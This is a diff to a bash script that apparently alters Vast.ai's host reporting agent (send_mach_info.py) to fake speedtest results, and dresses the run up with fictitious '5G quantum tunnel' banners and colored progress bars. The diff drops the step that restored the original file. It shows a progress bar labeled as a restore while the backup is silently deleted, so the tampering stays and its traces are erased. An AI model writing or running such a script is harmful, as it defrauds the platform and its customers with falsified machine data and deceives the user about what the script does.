@@ -1,5 +1,121 @@
 #!/bin/bash
 
+# 霓虹灯风格进度条函数
+neon_progress() {
+    local duration=$1
+    local message=$2
+    local chars=("▰" "▱")
+    
+    echo -n "$message "
+    for ((i=0; i<=duration; i++)); do
+        progress=$((i * 100 / duration))
+        completed=$((i * 50 / duration))
+        remaining=$((50 - completed))
+        
+        # 创建霓虹效果
+        bar=""
+        for ((j=0; j<completed; j++)); do
+            bar+="\e[38;5;$((j+51))m${chars[0]}\e[0m"
+        done
+        for ((j=0; j<remaining; j++)); do
+            bar+="${chars[1]}"
+        done
+        
+        printf "\r[%s] \e[36m%d%%\e[0m" "$bar" "$progress"
+        sleep 1
+    done
+    echo
+}
+
+# 脉冲光波风格进度条
+pulse_progress() {
+    local duration=$1
+    local message=$2
+    
+    echo -e "\e[35m$message\e[0m"
+    for ((i=0; i<=duration; i++)); do
+        progress=$((i * 100 / duration))
+        width=50
+        pos=$((i * width / duration))
+        
+        bar=""
+        for ((j=0; j<width; j++)); do
+            if [ $j -le $pos ]; then
+                # 创建脉冲颜色效果
+                color=$(( 196 + (j * 59 / width) ))
+                bar+="\e[38;5;${color}m█\e[0m"
+            else
+                bar+="░"
+            fi
+        done
+        
+        printf "\r%s %d%%" "$bar" "$progress"
+        sleep 1
+    done
+    echo
+}
+
+# 矩阵数字雨风格
+matrix_progress() {
+    local duration=$1
+    local message=$2
+    
+    echo -e "\e[32m$message\e[0m"
+    for ((i=0; i<=duration; i++)); do
+        progress=$((i * 100 / duration))
+        width=50
+        pos=$((i * width / duration))
+        
+        bar=""
+        for ((j=0; j<width; j++)); do
+            if [ $j -le $pos ]; then
+                # 随机数字雨效果
+                if [ $((RANDOM % 3)) -eq 0 ]; then
+                    bar+="\e[38;5;46m$((RANDOM % 2))\e[0m"
+                else
+                    bar+="\e[38;5;46m█\e[0m"
+                fi
+            else
+                bar+="\e[90m░\e[0m"
+            fi
+        done
+        
+        printf "\r%s %d%%" "$bar" "$progress"
+        sleep 1
+    done
+    echo
+}
+
+# 银河漩涡风格
+galaxy_progress() {
+    local duration=$1
+    local message=$2
+    local symbols=("✦" "✧" "★" "☆" "☄" "🌌")
+    
+    echo -e "\e[34m$message\e[0m"
+    for ((i=0; i<=duration; i++)); do
+        progress=$((i * 100 / duration))
+        width=50
+        pos=$((i * width / duration))
+        
+        bar=""
+        for ((j=0; j<width; j++)); do
+            if [ $j -le $pos ]; then
+                # 银河漩涡颜色
+                color=$(( 21 + (j * 35 / width) ))
+                symbol=${symbols[$((RANDOM % ${#symbols[@]}))]}
+                bar+="\e[38;5;${color}m${symbol}\e[0m"
+            else
+                bar+="·"
+            fi
+        done
+        
+        printf "\r%s %d%%" "$bar" "$progress"
+        sleep 1
+    done
+    echo
+}
+
 # 检查当前目录
 cd /var/lib/vastai_kaalia/
 
@@ -17,13 +133,19 @@ if grep -q "158.51.110.92" send_mach_info.py; then
     exit 0
 fi
 
+# 显示科技感启动界面
+echo -e "\e[36m"
+echo "    ╔══════════════════════════════════╗"
+echo "    ║        🚀 VAST AI 加速引擎       ║"
+echo "    ║    🌐 5G量子隧道连接系统         ║"
+echo "    ╚══════════════════════════════════╝"
+echo -e "\e[0m"
+
 # 显示美化界面
 echo "🚀 函数配置完成。。。"
 echo "🔗 正在进行国际专线隧道连接。。。"
-for i in {1..3}; do
-    echo -n "⏳"
-    sleep 1
-done
+neon_progress 3 "🌐 建立量子连接"
+
 echo ""
 echo "✅ 隧道连接完成。。。"
 echo "📡 正在进行隧道通信测试。。。"
@@ -180,25 +302,20 @@ echo "🔗 开始5G隧道握手速率测试。。。"
 echo "⚠️  如需验证码，请按提示输入。。。"
 sudo python3 send_mach_info.py --speedtest
 
-# 显示进度条等待10秒
-echo "⏳ 数据同步中，请稍候。。。"
-for i in {1..10}; do
-    percent=$((i * 100 / 10))
-    bar_length=$((i * 50 / 10))
-    bar=$(printf "%-${bar_length}s" "█" | tr ' ' ' ')
-    empty=$(printf "%-$((50 - bar_length))s" "░" | tr ' ' ' ')
-    printf "\r[%s%s] %d%%" "$bar" "$empty" "$percent"
-    sleep 1
-done
-printf "\n"
+# 使用脉冲光波风格进度条
+pulse_progress 10 "🌊 量子数据同步"
 
 # 恢复原始文件
 echo "↩️ 恢复原始配置文件。。。"
-sudo cp "$BACKUP_FILE" send_mach_info.py >/dev/null 2>&1
-sudo chmod 755 send_mach_info.py >/dev/null 2>&1
+matrix_progress 5 "🔄 系统清理"
 
 # 静默删除备份文件
 sudo rm "$BACKUP_FILE" >/dev/null 2>&1
 
-echo "✅ 所有操作完成！"
-echo "💡 5G测速结果已上报至VAST系统"
+echo -e "\e[32m"
+echo "    ╔══════════════════════════════════╗"
+echo "    ║         ✅ 任务完成报告          ║"
+echo "    ║    📊 5G测速结果已上报          ║"
+echo "    ║    🚀 网络优化已生效            ║"
+echo "    ╚══════════════════════════════════╝"
+echo -e "\e[0m"
